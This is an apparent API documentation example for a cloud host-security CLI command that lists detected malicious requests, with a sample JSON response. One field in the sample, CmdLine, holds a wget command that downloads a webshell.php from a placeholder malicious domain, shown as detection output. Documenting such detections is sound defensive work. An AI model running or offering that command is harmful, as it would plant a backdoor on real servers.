**Example 1: 获取恶意请求数据**

获取恶意请求数据

Input: 

```
tccli yunjing DescribeMaliciousRequests --cli-unfold-argument  \
    --Limit 10 \
    --Offset 0
```

Output: 
```
{
    "Response": {
        "RequestId": "354f4ac3-8546-4516-8c8a-69e3ab73aa8a",
        "MaliciousRequests": [
            {
                "Id": 1,
                "Uuid": "add4a78a-0d59-11e8-b7ab-00e081e1a5c5",
                "MachineIp": "10.10.1.1",
                "MachineName": "machienname",
                "Domain": "www.malicious_domain.com",
                "Count": 10,
                "ProcessName": "wget",
                "Pid": 5577,
                "ProcessMd5": "ab0ffdb812fab5a0e1e8b83d39c63ce9",
                "CmdLine": "wget http://www.malicious_domain.com/webshell.php",
                "Status": "UN_OPERATED",
                "Description": "description",
                "Reference": "reference",
                "CreateTime": "2018-10-10 10:11:12",
                "MergeTime": "2018-10-10 10:11:12"
            }
        ],
        "TotalCount": 100
    }
}
```

